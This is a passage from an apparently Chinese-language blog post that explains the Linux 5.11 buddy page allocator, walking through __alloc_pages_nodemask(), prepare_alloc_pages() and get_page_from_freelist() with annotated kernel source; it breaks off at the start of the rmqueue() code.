zone_idx(zoneref-&gt;zone) */</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>preferred_zoneref</li></ul><p>该成员为一个 <code>zoneref</code> 类型的结构体，表示<strong>优先用来进行分配的 zone</strong></p><ul><li>spread_dirty_pages</li></ul><p>布尔值，表示<strong>此次分配是否可能产生脏页</strong>（需要进行写回），通常分配需要写入的页会出现</p><h2 id="三、-alloc-pages-nodemask-：分配页面的「核心函数」，返回-page-结构体"><a href="#三、-alloc-pages-nodemask-：分配页面的「核心函数」，返回-page-结构体" class="headerlink" title="三、__alloc_pages_nodemask()：分配页面的「核心函数」，返回 page 结构体"></a>三、__alloc_pages_nodemask()：分配页面的「核心函数」，返回 page 结构体</h2><p>该函数是 buddy system 中用以进行页面分配的<strong>核心函数</strong>，所有的页面分配 API 都是基于该函数的封装，其需要传入的四个参数为：</p><ul><li><code>gfp_mask</code>：分配行为参数（可以参见 <a href="https://blog.csdn.net/choumin/article/details/109603011">这里</a>）</li><li><code>order</code>：分配的连续物理页框的阶</li><li><code>preferred_nid</code> 选取的节点的 id</li><li><code>nodemask</code>：</li></ul><p>返回值为分配的<strong>连续物理页</strong>中的第一张物理页的 <code>page</code> 结构体</p><blockquote><p>如果你已经不记得 page 结构体与物理页的页框号间的转换公式了，可以回去看<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#%EF%BC%881%EF%BC%89page-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%B0-PFN%EF%BC%9Apage-%E7%BB%93%E6%9E%84%E4%BD%93%E5%9C%B0%E5%9D%80%E5%87%8F%E5%8E%BB%E5%AF%B9%E5%BA%94-mem-section-gt-section-mem-map">上一篇文章</a></p><p>当然，笔者比较好心（笑），这里直接给出计算公式，<code>mem_section</code> 结构体中的 <code>section_mem_map</code> 成员存储了其起始地址减掉其起始地址对应的物理页框的页框号的差值，该成员与 page 结构体间做<strong>指针差值运算</strong>便能获得 page 结构体对应的物理页框号：<br>$$<br>address_{struct\ page} - section_mem_map &#x3D; address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>&#x3D;(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>&#x3D;PFN<br>$$</p></blockquote><p>这是一张_Overview_</p><p><img src="https://i.loli.net/2021/11/30/9srbaMvWeTSO1hc.png" alt="从知乎偷的.png"></p><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is the &#x27;heart&#x27; of the zoned buddy allocator.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_nodemask</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">preferred_nid</span>,</span><br><span class="hljs-class"><span class="hljs-title">nodemask_t</span> *<span class="hljs-title">nodemask</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags = ALLOC_WMARK_LOW;<br><span class="hljs-type">gfp_t</span> alloc_mask; <span class="hljs-comment">/* 实际用于分配的 gfp_t ，这是一个int类型的整型*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> <span class="hljs-title">ac</span> =</span> &#123; &#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们假定 order 的值在一些地方是正常的，</span><br><span class="hljs-comment"> * 因此若请求超出范围则提前退出</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &gt;= MAX_ORDER)) &#123;<br>WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>gfp_mask &amp;= gfp_allowed_mask;<br>alloc_mask = gfp_mask;<br><span class="hljs-keyword">if</span> (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 直到所有的 local zone 都被考虑之前，</span><br><span class="hljs-comment"> * 禁止从 falling back 到内存碎片种类的第一次传递</span><br><span class="hljs-comment"> */</span><br>alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);<br><br><span class="hljs-comment">/* 第一次分配尝试 */</span><br>page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);<br><span class="hljs-keyword">if</span> (likely(page))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 应用作用域分配约束 这主要与 GFP_NOFS 有关。</span><br><span class="hljs-comment"> * GFP_NOIO 必须从一个特定的由 memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;</span><br><span class="hljs-comment"> * 所标记的上下文中所有的分配请求中继承</span><br><span class="hljs-comment"> */</span><br>alloc_mask = current_gfp_context(gfp_mask);<br>ac.spread_dirty_pages = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 恢复最初的 nodemask （其可能被替换为 &amp;cpuset_current_mems_allowed</span><br><span class="hljs-comment"> * 以优化快速（分配）路径的尝试）</span><br><span class="hljs-comment"> */</span><br>ac.nodemask = nodemask;<br><br>page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);<br><br>out:<br><span class="hljs-keyword">if</span> (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;<br>    unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != <span class="hljs-number">0</span>)) &#123;<br>__free_pages(page, order);<br>page = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br>EXPORT_SYMBOL(__alloc_pages_nodemask);<br></code></pre></td></tr></table></figure><p>这个函数的具体步骤主要分为三步：</p><ul><li>检查参数合法性，并做分配前准备工作</li><li>进行<strong>快速分配</strong>，成功则直接返回结果</li><li>若快速分配失败，则进行<strong>慢速分配</strong></li></ul><p>接下来我们来深入快速分配与慢速分配的内部细节</p><h3 id="I-prepare-alloc-pages-：分配前的准备工作"><a href="#I-prepare-alloc-pages-：分配前的准备工作" class="headerlink" title="I. prepare_alloc_pages()：分配前的准备工作"></a>I. prepare_alloc_pages()：分配前的准备工作</h3><p>这个函数比较简单，主要是做分配前的一些准备的工作，包括初始化 <code>alloc_context</code> 结构体、获取 zone 数组等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">prepare_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">int</span> preferred_nid, <span class="hljs-type">nodemask_t</span> *nodemask,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> alloc_context *ac, <span class="hljs-type">gfp_t</span> *alloc_mask,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *alloc_flags)</span><br>&#123;<br>ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);<br>ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask); <span class="hljs-comment">// 获取 zonelist</span><br>ac-&gt;nodemask = nodemask;<br>ac-&gt;migratetype = gfp_migratetype(gfp_mask);<br><br>    <span class="hljs-comment">// 若开启了 cpuset（限制某一组进程只运行在某些cpu和内存节点上），则设置对应的标志位。</span><br><span class="hljs-keyword">if</span> (cpusets_enabled()) &#123;<br>*alloc_mask |= __GFP_HARDWALL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若我们在中断上下文中, 则这与当前进程上下文无关。</span><br><span class="hljs-comment"> * 这意味着任一 node 都是 ok 的.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!in_interrupt() &amp;&amp; !ac-&gt;nodemask)<br>ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;<br><span class="hljs-keyword">else</span><br>*alloc_flags |= ALLOC_CPUSET;<br>&#125;<br><br>fs_reclaim_acquire(gfp_mask);<br>fs_reclaim_release(gfp_mask);<br><br>might_sleep_if(gfp_mask &amp; __GFP_DIRECT_RECLAIM);<br><br><span class="hljs-keyword">if</span> (should_fail_alloc_page(gfp_mask, order))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>*alloc_flags = current_alloc_flags(gfp_mask, *alloc_flags);<br><br><span class="hljs-comment">/* Dirty zone 的平衡仅在 fast path 中完成 */</span><br>ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * preferred zone 被用于进行数据统计， 但非常重要的是其页被用作</span><br><span class="hljs-comment"> * zonelist 迭代器的起始点. 对于忽略内存策略的分配，其可能会被重置。</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先调用 <code>node_zonelist()</code> 从 <code>preferred_nid</code> 参数所指定的 node 中获取一个 zonelist，其实就是取 <code>pglist_data-&gt;node_zonelists[gfp_zonelist(flags)]</code></li><li>进行 cpuset 相关判断与标志位设置，若是在中断上下文则直接将 nodemask 设为 <code>cpuset_current_mems_allowed</code></li><li>最后调用 <code>first_zones_zonelist()</code> 设置 preferred zone，大概是在 zonelist 中→nodemask 所包含的 zone 中→ <code>highest_zoneidx</code> 以下的第一个 zone</li></ul><blockquote><p>反正源码注释是这么写的hhh</p></blockquote><h3 id="II-get-page-from-freelist-：快速分配路径（核心分配函数）"><a href="#II-get-page-from-freelist-：快速分配路径（核心分配函数）" class="headerlink" title="II. get_page_from_freelist()：快速分配路径（核心分配函数）"></a>II. get_page_from_freelist()：快速分配路径（核心分配函数）</h3><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要是遍历分配上下文对应的 zonelist 中的 zone 进行内存分配，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * get_page_from_freelist 遍历 zonelist 尝试分配页面</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<br><span class="hljs-title function_">get_page_from_freelist</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order, <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> alloc_context *ac)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">z</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> *<span class="hljs-title">last_pgdat_dirty_limit</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> no_fallback;<br><br>retry:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 扫描 zonelist, 寻找有着足够空闲页面的 zone.</span><br><span class="hljs-comment"> * 参见 __cpuset_node_allowed() 的注释（kernel/cpuset.c）</span><br><span class="hljs-comment"> */</span><br>no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT; <span class="hljs-comment">// 避免内存碎片的flag</span><br>z = ac-&gt;preferred_zoneref; <span class="hljs-comment">// 先尝试从 preferred zone 中分配</span><br>    <span class="hljs-comment">// 这是一个封装宏，表示从 z 开始遍历 zonelist 中的 zoneref 数组，</span><br>    <span class="hljs-comment">// 其核心是单次迭代调用 next_zones_zonelist()，该函数返回:</span><br>    <span class="hljs-comment">// 在 nodemask 的 zone 中，以当前 zone 作为起点游标的</span><br>    <span class="hljs-comment">// 【位于或低于】highest_zoneidx 的下一个 zone</span><br>for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,<br>ac-&gt;nodemask) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mark;<br><br>        <span class="hljs-comment">// 开启了 cpuset 且 flag 中有 ALLOC_CPUSET 标志位，</span><br>        <span class="hljs-comment">// 但是 cpuset 中不允许以该 gfp_mask 在该 zone 中分配，</span><br>        <span class="hljs-comment">// 进行下一次迭代</span><br><span class="hljs-keyword">if</span> (cpusets_enabled() &amp;&amp;<br>(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;<br>!__cpuset_zone_allowed(zone, gfp_mask))<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在分配页缓存（page cache）页以进行写入时, 我们想要</span><br><span class="hljs-comment"> * 在一个节点的“脏限制”（dirty limit）内获得他, </span><br><span class="hljs-comment">         * 由此，没有一个节点有着超过全局允许的脏页比例。</span><br><span class="hljs-comment"> * 脏限制考虑了节点的低端内存保留和高水位线，</span><br><span class="hljs-comment"> * 以便于 kswapd 能平衡它，而不必从其 LRU 列表中写入页面。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">XXX:</span> 现在, 在进入回收之前，</span><br><span class="hljs-comment"> * 允许分配可能超过 慢速路径中 (spread_dirty_pages unset)</span><br><span class="hljs-comment"> * 单节点的 dirty limit，这在一个允许节点们在一起都未够大以达到全局限制</span><br><span class="hljs-comment">         * 的 NUMA 设置中是很重要的。对于这些情况的合适的修补将需要对</span><br><span class="hljs-comment"> * dirty-throttling 与 flusher threads 中节点的意识.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 译注：原文就是XXX，笔者也不知道这个XXX是什么...</span><br>        <span class="hljs-comment">// 大概就是检查当前zone对应node的脏页数量是不是达到限制了</span><br><span class="hljs-keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;<br><span class="hljs-keyword">if</span> (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span> (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;<br>last_pgdat_dirty_limit = zone-&gt;zone_pgdat;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// node 数量大于1，且当前 zone 并非 preferred zone</span><br><span class="hljs-keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="hljs-number">1</span> &amp;&amp;<br>    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;<br><span class="hljs-type">int</span> local_nid;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若移动到了 remote node（译注：非当前node？）, 则重试，</span><br><span class="hljs-comment"> * 但允许 fragmenting fallbacks. 局部性比避免碎片更加重要。</span><br><span class="hljs-comment"> */</span><br>            <span class="hljs-comment">// 比对当前 zone 是否在 local node（就是离当前CPU最近那个 node）</span><br>            <span class="hljs-comment">// 若否，则去掉 ALLOC_NOFRAGMENT 标志位，并从 preferred zone 开始重试。</span><br>            <span class="hljs-comment">// 即：kernel 更倾向于优先从 local zone 进行分配，哪怕会产生内存碎片</span><br>local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);<br><span class="hljs-keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// 获取当前 zone 的水位线标记</span><br>mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);<br><span class="hljs-keyword">if</span> (!zone_watermark_fast(zone, order, mark,<br>       ac-&gt;highest_zoneidx, alloc_flags,<br>       gfp_mask)) &#123; <span class="hljs-comment">// 水位线相关操作</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 该 zone 的水位线失败, 但若其包含了 deferred pages，</span><br><span class="hljs-comment"> * 则我们会看该 zone 是否还能再进行扩展</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* Checked here to keep the fast path fast */</span><br>BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);<br>            <span class="hljs-comment">// 该标志位意为【不检查水位线】，此时我们直接尝试从该 zone 中分配</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">if</span> (node_reclaim_mode == <span class="hljs-number">0</span> ||<br>    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))<br><span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-comment">// 首先进行页面回收，之后查看是否满足水位线要求，若‘</span><br>            <span class="hljs-comment">// 不扫描/没有可回收/检查未通过</span><br>            <span class="hljs-comment">// 则都会进行下一次迭代，尝试下一个 zone</span><br>ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);<br><span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_NOSCAN:<br><span class="hljs-comment">/* 不扫描 */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_FULL:<br><span class="hljs-comment">/* 扫描了但不可回收 */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">/* 检查我们是否回收了足够页面 */</span><br><span class="hljs-keyword">if</span> (zone_watermark_ok(zone, order, mark,<br>ac-&gt;highest_zoneidx, alloc_flags))<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>try_this_zone:<br>        <span class="hljs-comment">// 来到该 label 表示我们终于通过了前面一系列的各种检查，现在开始正式进行页面分配</span><br>        <span class="hljs-comment">// **************************</span><br>        <span class="hljs-comment">// rmqueue() 即为我们在OS教科书上看到的的 buddy system 模型,</span><br>        <span class="hljs-comment">// 取 freelist 对应下标 page，若无则向上遍历拆更高 order 的 page</span><br>        <span class="hljs-comment">// **************************</span><br>page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,<br>gfp_mask, alloc_flags, ac-&gt;migratetype);<br><span class="hljs-keyword">if</span> (page) &#123;<br>prep_new_page(page, order, gfp_mask, alloc_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若这是一个高阶的原子分配，</span><br><span class="hljs-comment"> * 检查我们是否该为将来保留 pageblock</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))<br>reserve_highatomic_pageblock(page, zone, order);<br><br><span class="hljs-keyword">return</span> page;<span class="hljs-comment">// 取到了，返回</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 没取到</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">/* 若该 zone 有 deferred pages，再试一遍 */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在一台 UMA 机器上可能所以的 zone 都是破碎的，</span><br><span class="hljs-comment"> * 若避免碎片, 重置并重试.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (no_fallback) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数流程总结如下：</p><ul><li><p><code>for_next_zone_zonelist_nodemask</code> 迭代遍历分配上下文中 zonelist 中的 zoneref 数组 对应的 zone</p><blockquote><p>其核心是单次迭代调用 next_zones_zonelist()，该函数返回:</p><ul><li>在 nodemask 的 zone 中，以当前 zone 作为起点游标的【位于或低于】highest_zoneidx 的下一个 zone</li></ul></blockquote><ul><li><p>若开启了 cpuset，检查当前 zone 是否满足 cpuset 的要求，若否，则尝试下一个 zone</p></li><li><p>检查当前 zone 对应 node 的脏页数量是否超出限制，若否，则尝试下一个 zone</p></li><li><p>若 <code>ALLOC_NOFRAGMENT</code> 但是当前 zone 非 preferred zone、且对应 node 为 remote node，则清除该标志位后<strong>重新开始分配</strong>，因为 locality 比避免碎片更加重要</p></li><li><p>获取当前 zone 的水位线标记</p><ul><li>若是设置了 <code>ALLOC_NO_WATERMARKS</code> 则直接到下一步进行分配</li><li>若水位线检查未通过，调用 <code>node_reclaim()</code> 进行页面回收</li><li>若回收后页面还是不足，则尝试下一个 zone</li></ul></li><li><p>调用 <code>rmqueue()</code> 正式进行内存分配，该函数即为 buddy system 分配算法</p></li></ul></li></ul><p><img src="https://s2.loli.net/2022/07/05/SJMKys31ofnTPXc.png" alt="偷的图.png"></p><h4 id="rmqueue-：从给定的-page-中进行页面分配"><a href="#rmqueue-：从给定的-page-中进行页面分配" class="headerlink" title="rmqueue()：从给定的 page 中进行页面分配"></a>rmqueue()：从给定的 page 中进行页面分配</h4><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要是从给定 zone 中进行内存分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 